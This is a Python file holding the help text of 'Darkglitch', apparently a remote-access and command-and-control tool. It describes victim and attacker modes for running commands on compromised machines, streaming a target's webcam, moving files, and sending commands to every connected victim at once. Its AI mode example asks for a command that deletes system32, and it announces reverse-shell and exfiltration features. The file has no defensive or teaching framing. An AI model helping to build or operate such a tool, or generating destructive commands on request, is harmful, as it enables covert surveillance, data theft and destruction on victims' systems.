from utils import banner, version

def helper():

    banner.randomizer()
    print(f"""
Darkglitch {version.version()} ( https://github.com/LaVenganzaDelLadron/darkglitch.git )
Advanced Command & Control Framework for Remote System Management

DESCRIPTION:
  Darkglitch is a powerful post-exploitation framework designed for remote
  command execution, file transfer, and media streaming capabilities. It
  operates in a client-server architecture with secure communication.

USAGE:
  darkglitch [MODE] [OPTIONS] [ARGUMENTS]

MODES:
  Victim (Client Mode):
    darkglitch -l -c                      Listen for connections (command mode)
    darkglitch -l -s                      Listen for connections (stream mode)

  Attacker (Server Mode):
    darkglitch -ol                        List all online connected clients
    darkglitch -c <client_id> <cmd>       Execute command on target
    darkglitch -s <client_id>             Stream webcam from target
    darkglitch -u <client_id> <src>       Upload file to target
    darkglitch -d <client_id> <src>       Download file from target
    darkglitch -all <cmd>                 Target all connected clients using command
    darkglitch -ai <client_id> <prompt>   Using Prompt to execute command

GENERAL OPTIONS:
  -h, --help                              Display this help message
  -v, --version                           Display version information

ARGUMENTS:
  <client_id>                             Target client identifier
  <command>                               Shell command to execute
  <src>, <source>                         Source file or directory path
  [dst], [destination]                    Destination path (optional)

EXAMPLES:
  # Start a client listener
  darkglitch -l -c

  # List all connected clients
  darkglitch -ol

  # Execute command on target client
  darkglitch -c <client_id> "whoami"

  # Stream webcam from target
  darkglitch -s <client_id>

  # Upload local file to target
  darkglitch -u <client_id> <src> [dst]

  # Download file from target
  darkglitch -d <client_id> <src> [dst]

  # All option is to send a command to all available/online targets
  darkglitch -all "whoami"
  
  # AI
  darkglitch -ai <client_id> "give me a command that can delete system32"

COMING SOON:
  -rc, --reverse-shell                    Establish reverse shell connection
  -ex, --exfiltrate                       Data exfiltration capabilities

SEE ALSO:
  GitHub: https://github.com/LaVenganzaDelLadron/
  Documentation: Check README.md for detailed usage guides
    """)